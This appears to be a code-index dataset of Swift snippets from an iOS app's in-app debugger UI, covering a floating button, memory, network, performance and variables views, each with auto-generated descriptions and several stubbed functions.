layer.shadowOpacity = 0.3
layer.shadowRadius = 4"
1145,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function setupGestures - sets upgestures","private func setupGestures() {
// Pan gesture for dragging
let newPanGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:)))
newPanGesture.minimumNumberOfTouches = 1
newPanGesture.maximumNumberOfTouches = 1
addGestureRecognizer(newPanGesture)
panGesture = newPanGesture
}

@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {"
1146,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function handlePan - implements handlepan functionality","@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {
guard let superview = superview else { return }"
1147,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function savePosition - implements saveposition functionality","private func savePosition() {
UserDefaults.standard.set(center.x, forKey: positionXKey)
UserDefaults.standard.set(center.y, forKey: positionYKey)
}

private func restorePosition() {"
1148,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function restorePosition - implements restoreposition functionality","private func restorePosition() {
// Get saved position, or use default
let x = UserDefaults.standard.double(forKey: positionXKey)
let y = UserDefaults.standard.double(forKey: positionYKey)

if x > 0 && y > 0 {"
1149,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","/ Update button appearance based on system theme","func updateAppearance() {
// Get current trait collection
let interfaceStyle = UIScreen.main.traitCollection.userInterfaceStyle

if interfaceStyle == .dark {"
1150,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function buttonTapped - implements buttontapped functionality","@objc private func buttonTapped() {
// Provide haptic feedback
let generator = UIImpactFeedbackGenerator(style: .medium)
generator.impactOccurred()

// Post notification to launch debugger
NotificationCenter.default.post(name: .showDebugger, object: nil)

logger.log(message: ""Floating debugger button tapped"", type: .info)
}"
1151,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function didMoveToSuperview - implements didmovetosuperview functionality","override func didMoveToSuperview() {
super.didMoveToSuperview()

// Restore position when added to view
if superview != nil {"
1152,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

// Update appearance when theme changes
if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
1153,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Add notification names for debugger button control","extension Notification.Name {
static let showDebugger = Notification.Name(""showDebugger"")
static let showDebuggerButton = Notification.Name(""showDebuggerButton"")
static let hideDebuggerButton = Notification.Name(""hideDebuggerButton"")
}
"
1154,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","/ View controller for the memory tab in the debugger","class MemoryViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Text view for displaying memory content"
1155,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()

// Set title
title = ""Memory""
}
"
1156,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add address text field
view.addSubview(addressTextField)

// Add size text field
view.addSubview(sizeTextField)
"
1157,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for examine button
examineButton.addTarget(self, action: #selector(examineButtonTapped), for: .touchUpInside)

// Add target for format segmented control
formatSegmentedControl.addTarget(self, action: #selector(formatChanged), for: .valueChanged)
}

// MARK: - Actions
"
1158,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","MARK: - Actions","@objc private func examineButtonTapped() {
// Dismiss keyboard
view.endEditing(true)

// Get address and size
guard let addressText = addressTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),
let sizeText = sizeTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),
!addressText.isEmpty,
!sizeText.isEmpty,
let size = Int(sizeText)"
1159,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","Function formatChanged - implements formatchanged functionality","@objc private func formatChanged(_: UISegmentedControl) {
// Re-format the current memory output
if !memoryTextView.text.isEmpty {"
1160,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","MARK: - Helper Methods","private func showError(_ message: String) {
let alertController = UIAlertController(
title: ""Error"",
message: message,
preferredStyle: .alert
)

let okAction = UIAlertAction(title: ""OK"", style: .default)
alertController.addAction(okAction)
"
1161,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","Function formatMemoryOutput - implements formatmemoryoutput functionality","private func formatMemoryOutput(_ output: String) -> String {
// In a real implementation, this would parse and format the memory output
// based on the selected format (hex, ASCII, decimal, binary)

// For now, just return the original output
return output
}
}

// MARK: - UITextFieldDelegate"
1162,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","MARK: - UITextFieldDelegate","extension MemoryViewController: UITextFieldDelegate {
func textFieldShouldReturn(_ textField: UITextField) -> Bool {"
1163,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift","Function textFieldShouldReturn - implements textfieldshouldreturn functionality","func textFieldShouldReturn(_ textField: UITextField) -> Bool {
if textField == addressTextField {"
1164,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","/ View controller for the network tab in the debugger","class NetworkMonitorViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Table view for displaying network requests"
1165,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()
setupNetworkMonitoring()

// Set title
title = ""Network""
"
1166,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add search bar
view.addSubview(searchBar)

// Add clear button
view.addSubview(clearButton)
"
1167,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for refresh control
refreshControl.addTarget(self, action: #selector(refreshNetworkRequests), for: .valueChanged)

// Add target for clear button
clearButton.addTarget(self, action: #selector(clearButtonTapped), for: .touchUpInside)
}

private func setupNetworkMonitoring() {"
1168,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function setupNetworkMonitoring - sets upnetworkmonitoring","private func setupNetworkMonitoring() {
// In a real implementation, this would set up URLProtocol swizzling
// to intercept and monitor network requests

// For now, just log that network monitoring is set up
logger.log(message: ""Network monitoring set up"", type: .info)
}

// MARK: - Actions
"
1169,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Actions","@objc private func refreshNetworkRequests() {
// In a real implementation, this would refresh the network requests

// For now, just end refreshing
refreshControl.endRefreshing()
}

@objc private func clearButtonTapped() {"
1170,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function clearButtonTapped - implements clearbuttontapped functionality","@objc private func clearButtonTapped() {
// Clear network requests
networkRequests.removeAll()
filteredRequests.removeAll()

// Reload table view
tableView.reloadData()
}

// MARK: - Helper Methods"
1171,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Helper Methods","private func addSampleData() {
// Add some sample network requests for demonstration
let request1 = NetworkRequest(
url: URL(string: ""https://api.example.com/users"")!,
method: ""GET"",
requestHeaders: [""Authorization"": ""Bearer token123""],
requestBody: nil,
responseStatus: 200,
responseHeaders: [""Content-Type"": ""application/json""],
responseBody: ""{\""users\"": [{\""id\"": 1, \""name\"": \""John\""}]}"","
1172,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function filterRequests - implements filterrequests functionality","private func filterRequests() {
// Apply search filter
if searchText.isEmpty {"
1173,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - UITableViewDelegate","extension NetworkMonitorViewController: UITableViewDelegate {
func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
1174,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

// Get request
let request = filteredRequests[indexPath.row]

// Show request details
let detailsVC = NetworkRequestDetailsViewController(request: request)
navigationController?.pushViewController(detailsVC, animated: true)
}"
1175,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {
return 70
}
}

// MARK: - UITableViewDataSource

extension NetworkMonitorViewController: UITableViewDataSource {"
1176,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - UITableViewDataSource","extension NetworkMonitorViewController: UITableViewDataSource {
func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
1177,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return filteredRequests.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
1178,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let cell = tableView.dequeueReusableCell(
withIdentifier: NetworkRequestTableViewCell.reuseIdentifier,
for: indexPath
) as? NetworkRequestTableViewCell else {"
1179,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - UISearchBarDelegate","extension NetworkMonitorViewController: UISearchBarDelegate {
func searchBar(_: UISearchBar, textDidChange searchText: String) {"
1180,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function searchBar - implements searchbar functionality","func searchBar(_: UISearchBar, textDidChange searchText: String) {
// Update search text
self.searchText = searchText

// Apply filter
filterRequests()
}

func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {"
1181,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function searchBarSearchButtonClicked - implements searchbarsearchbuttonclicked functionality","func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {
// Dismiss keyboard
searchBar.resignFirstResponder()
}
}

// MARK: - NetworkRequest

struct NetworkRequest {"
1182,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - NetworkRequest","struct NetworkRequest {
let url: URL
let method: String
let requestHeaders: [String: String]
let requestBody: String?
let responseStatus: Int
let responseHeaders: [String: String]
let responseBody: String?
let timestamp: Date
let duration: TimeInterval"
1183,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - NetworkRequestTableViewCell","class NetworkRequestTableViewCell: UITableViewCell {
// MARK: - Properties

static let reuseIdentifier = ""NetworkRequestTableViewCell""

/// URL label
private let urlLabel: UILabel = {"
1184,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Setup","private func setupUI() {
// Add method label
contentView.addSubview(methodLabel)

// Add URL label
contentView.addSubview(urlLabel)

// Add status label
contentView.addSubview(statusLabel)
"
1185,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Configuration","func configure(with request: NetworkRequest) {
// Set URL label
urlLabel.text = request.url.absoluteString

// Set method label
methodLabel.text = request.method

// Set method label background color
switch request.method {"
1186,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - NetworkRequestDetailsViewController","class NetworkRequestDetailsViewController: UIViewController {
// MARK: - Properties

/// The network request
private let request: NetworkRequest

/// Scroll view
private let scrollView: UIScrollView = {"
1187,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()

// Set title
title = request.url.lastPathComponent
}
"
1188,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add scroll view
view.addSubview(scrollView)

// Add content view
scrollView.addSubview(contentView)
"
1189,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function setupRequestView - sets uprequestview","private func setupRequestView() {
// Create labels for request details
let urlTitleLabel = createTitleLabel(text: ""URL:"")
let urlValueLabel = createValueLabel(text: request.url.absoluteString)

let methodTitleLabel = createTitleLabel(text: ""Method:"")
let methodValueLabel = createValueLabel(text: request.method)

let headersTitleLabel = createTitleLabel(text: ""Headers:"")
let headersValueLabel = createValueLabel(text: formatHeaders(request.requestHeaders))"
1190,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function setupResponseView - sets upresponseview","private func setupResponseView() {
// Create labels for response details
let statusTitleLabel = createTitleLabel(text: ""Status:"")
let statusValueLabel = createValueLabel(text: ""\(request.responseStatus)"")

let headersTitleLabel = createTitleLabel(text: ""Headers:"")
let headersValueLabel = createValueLabel(text: formatHeaders(request.responseHeaders))

let bodyTitleLabel = createTitleLabel(text: ""Body:"")
let bodyValueLabel = createValueLabel(text: request.responseBody ?? ""None"")"
1191,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for segmented control
segmentedControl.addTarget(self, action: #selector(segmentChanged), for: .valueChanged)
}

// MARK: - Actions

@objc private func segmentChanged(_ sender: UISegmentedControl) {"
1192,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Actions","@objc private func segmentChanged(_ sender: UISegmentedControl) {
// Toggle visibility of request and response views
requestView.isHidden = sender.selectedSegmentIndex == 1
responseView.isHidden = sender.selectedSegmentIndex == 0
}

// MARK: - Helper Methods

private func createTitleLabel(text: String) -> UILabel {"
1193,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","MARK: - Helper Methods","private func createTitleLabel(text: String) -> UILabel {
let label = UILabel()
label.translatesAutoresizingMaskIntoConstraints = false
label.font = UIFont.systemFont(ofSize: 16, weight: .medium)
label.text = text
return label
}

private func createValueLabel(text: String) -> UILabel {"
1194,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function createValueLabel - creates valuelabel","private func createValueLabel(text: String) -> UILabel {
let label = UILabel()
label.translatesAutoresizingMaskIntoConstraints = false
label.font = UIFont.systemFont(ofSize: 14)
label.text = text
label.numberOfLines = 0
return label
}

private func formatHeaders(_ headers: [String: String]) -> String {"
1195,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift","Function formatHeaders - implements formatheaders functionality","private func formatHeaders(_ headers: [String: String]) -> String {
if headers.isEmpty {"
1196,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","/ View controller for the performance tab in the debugger","class PerformanceViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Segmented control for switching between metrics"
1197,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()

// Set title
title = ""Performance""

// Start monitoring"
1198,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Resume monitoring if needed
if updateTimer == nil {"
1199,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)

// Pause monitoring
stopMonitoring()
}

// MARK: - Setup

private func setupUI() {"
1200,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add segmented control
view.addSubview(segmentedControl)

// Add chart view
view.addSubview(chartView)
"
1201,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for segmented control
segmentedControl.addTarget(self, action: #selector(segmentChanged), for: .valueChanged)
}

// MARK: - Actions

@objc private func segmentChanged(_ sender: UISegmentedControl) {"
1202,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - Actions","@objc private func segmentChanged(_ sender: UISegmentedControl) {
// Update current metric type
switch sender.selectedSegmentIndex {"
1203,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - Monitoring","private func startMonitoring() {
// Start update timer
updateTimer = Timer.scheduledTimer(
timeInterval: 1.0,
target: self,
selector: #selector(updateMetrics),
userInfo: nil,
repeats: true
)
"
1204,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function stopMonitoring - implements stopmonitoring functionality","private func stopMonitoring() {
// Stop update timer
updateTimer?.invalidate()
updateTimer = nil
}

@objc private func updateMetrics() {"
1205,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function updateMetrics - updates metrics","@objc private func updateMetrics() {
// In a real implementation, this would use real performance monitoring APIs
// For now, just generate random metrics

// Update CPU usage
metrics.cpuUsage = min(max(metrics.cpuUsage + Double.random(in: -10 ... 10), 0), 100)

// Update memory usage
metrics.memoryUsage = min(max(metrics.memoryUsage + Double.random(in: -20 ... 20), 0), 1024)
"
1206,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function updateUI - updates ui","private func updateUI() {
// Update current usage label and description based on metric type
switch currentMetricType {"
1207,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function getColorForPercentage - retrieves colorforpercentage","private func getColorForPercentage(_ percentage: Double) -> UIColor {
if percentage < 30 {"
1208,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - UITableViewDelegate","extension PerformanceViewController: UITableViewDelegate {
func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
1209,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)
}
}

// MARK: - UITableViewDataSource

extension PerformanceViewController: UITableViewDataSource {"
1210,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - UITableViewDataSource","extension PerformanceViewController: UITableViewDataSource {
func numberOfSections(in _: UITableView) -> Int {"
1211,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function numberOfSections - implements numberofsections functionality","func numberOfSections(in _: UITableView) -> Int {
return 1
}

func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
1212,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
switch currentMetricType {"
1213,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""StatCell"", for: indexPath)

// Configure cell based on metric type
switch currentMetricType {"
1214,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","MARK: - Supporting Types / Metric type","enum MetricType {
case cpu
case memory
case gpu
case energy
}

/// Performance metrics
struct PerformanceMetricsData {"
1215,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift","/ Performance metrics","struct PerformanceMetricsData {
var cpuUsage: Double = 25.0
var memoryUsage: Double = 256.0
var gpuUsage: Double = 15.0
var energyImpact: Double = 3.0
}
"
1216,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","/ View controller for the variables tab in the debugger","class VariablesViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Table view for displaying variables"
1217,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()
setupNotifications()

// Set title
title = ""Variables""
"
1218,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Reload variables when view appears
reloadVariables()
}

// MARK: - Setup

private func setupUI() {"
1219,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add search bar
view.addSubview(searchBar)

// Add table view
view.addSubview(tableView)
"
1220,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for refresh control
refreshControl.addTarget(self, action: #selector(refreshVariables), for: .valueChanged)
}

private func setupNotifications() {"
1221,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function setupNotifications - sets upnotifications","private func setupNotifications() {
// Listen for execution state change notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(handleExecutionStateChanged),
name: .debuggerExecutionPaused,
object: nil
)

NotificationCenter.default.addObserver("
1222,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Actions","@objc private func refreshVariables() {
// Reload variables
reloadVariables()

// End refreshing
refreshControl.endRefreshing()
}

@objc private func handleExecutionStateChanged(_: Notification) {"
1223,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function handleExecutionStateChanged - implements handleexecutionstatechanged functionality","@objc private func handleExecutionStateChanged(_: Notification) {
// Reload variables when execution state changes
reloadVariables()
}

// MARK: - Helper Methods

private func reloadVariables() {"
1224,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Helper Methods","private func reloadVariables() {
// Get variables from debugger engine
variables = debuggerEngine.getVariables()

// Apply filter
filterVariables()

// Reload table view
tableView.reloadData()
}"
1225,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function filterVariables - implements filtervariables functionality","private func filterVariables() {
// Apply search filter
if searchText.isEmpty {"
1226,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - UITableViewDelegate","extension VariablesViewController: UITableViewDelegate {
func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
1227,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

// Get variable
let variable = filteredVariables[indexPath.row]

// Show variable details alert
let alertController = UIAlertController(
title: variable.name,
message: ""Type: \(variable.type)\nValue: \(variable.value)\nSummary: \(variable.summary)"","
1228,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {
return 60
}
}

// MARK: - UITableViewDataSource

extension VariablesViewController: UITableViewDataSource {"
1229,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - UITableViewDataSource","extension VariablesViewController: UITableViewDataSource {
func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
1230,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return filteredVariables.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
1231,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let cell = tableView.dequeueReusableCell(
withIdentifier: VariableTableViewCell.reuseIdentifier,
for: indexPath
) as? VariableTableViewCell else {"
1232,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - UISearchBarDelegate","extension VariablesViewController: UISearchBarDelegate {
func searchBar(_: UISearchBar, textDidChange searchText: String) {"
1233,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function searchBar - implements searchbar functionality","func searchBar(_: UISearchBar, textDidChange searchText: String) {
// Update search text
self.searchText = searchText

// Apply filter
filterVariables()

// Reload table view
tableView.reloadData()
}"
1234,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","Function searchBarSearchButtonClicked - implements searchbarsearchbuttonclicked functionality","func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {
// Dismiss keyboard
searchBar.resignFirstResponder()
}
}

// MARK: - VariableTableViewCell

class VariableTableViewCell: UITableViewCell {"
1235,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - VariableTableViewCell","class VariableTableViewCell: UITableViewCell {
// MARK: - Properties

static let reuseIdentifier = ""VariableTableViewCell""

/// Name label
private let nameLabel: UILabel = {"
1236,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Setup","private func setupUI() {
// Add name label
